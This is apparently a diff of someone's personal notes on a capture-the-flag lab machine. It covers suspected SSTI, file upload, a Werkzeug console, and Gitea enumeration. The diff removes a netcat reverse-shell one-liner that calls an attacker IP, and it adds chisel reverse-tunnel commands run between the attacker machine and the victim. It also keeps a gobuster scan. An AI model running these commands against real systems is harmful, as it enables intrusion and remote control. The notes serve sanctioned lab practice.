@@ -1,16 +1,13 @@
-
-
-
 # <span style="color:[COLOR]">Machine #27 OpenSource</span>  
-
 
 
 ## <span style="color:[COLOR]">Checklist 🤓   
 
 - [x] It might be SSTI
-- [ ] There could be a way to upload a file onto the web server ( a php file ) and executing it by visiting it.
-- [ ] The `/console` directory.
-
+- [x] There could be a way to upload a file onto the web server ( a php file ) and executing it by visiting it.
+- [x] The `/console` directory.
+- [ ] Try to accomplish port forwarding somehow so that I would be able to open up the local web server much easier.
+- [ ] Research the Gitea version.
 
 <br/><br/>
 
@@ -24,6 +21,15 @@
 * I think I can see the error because DEBUG mode is true.
 * The upload page seems to be using `Werkzeug`.
 * I think we're in a testing environment (Not sure) in the demo that they provided.
+* A local web server that I can only access through the container I got into.
+* There's a `swagger` data in a file called `swagger.v1.json` which means I have all the api endpoints and there data.
+* There's also a home page in the local web server that shows me that there's also a possibility that there exists a login and register page. But life would be so much easier if I can open the website on the browser that's why I'll play a bit with port forwarding.
+* A technology used called "Gitea" version 1.16.6
+
+<br/><br/>
+
+
+## <span style="color:[COLOR]">Random Notes👀
 * There are two methods `get_file_name` and `get_unique_file_name` and only the first one is being used.
 * What the hell is this!   
 ```html
@@ -128,15 +134,16 @@ def send_report(path):
 
 
 gobuster dir -u 10.10.11.164 -x 'txt,md,jpg,php,html' -w /usr/share/seclists/Discovery/Web-Content/big.txt -b '404,403'
-rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 4444 >/tmp/f
 
 
 
-<br/><br/>
 
 
-## <span style="color:[COLOR]">Random Notes👀
 
+* On my machine I should put the following command `./chisel server -p 8000 --reverse`.
+* On the victim `./chisel client 10.10.14.4:8000 R:80:10.10.11.164:3000`
+* Then after I do that you just go and open `http://localhost` on the browser and it will open it. YES!!!!
+* It's like using a reverse proxy for port forwarding.
 <br/><br/>  
 
 
